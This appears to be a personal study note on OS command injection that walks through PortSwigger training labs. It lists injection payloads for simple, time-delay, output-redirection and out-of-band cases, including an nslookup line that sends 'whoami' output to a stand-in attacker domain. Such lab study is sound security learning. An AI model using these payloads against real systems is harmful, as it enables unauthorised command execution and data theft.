
- some useful commands 
	- ![[Pasted image 20230904012200.png]]

# simple case
- ![[Pasted image 20230904011952.png]]
- just try to use one of them in the vuln filed
- use # at the end of submitted data, to comment what ever after the # 


# # with time delays
- & sleep 10 # 


# Lab: Blind OS [command injection](https://portswigger.net/web-security/os-command-injection) with output redirection
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:
    
    `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command:
    
    `filename=output.txt`
5. Observe that the response contains the output from the injected command.


- what if u have no access to the files u try to output redirection ? 
# Lab: Blind OS command injection with out-of-band interaction
- `` & nslookup urdomain.com #``


# Lab: Blind OS [command injection](https://portswigger.net/web-security/os-command-injection) with out-of-band data exfiltration
- ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``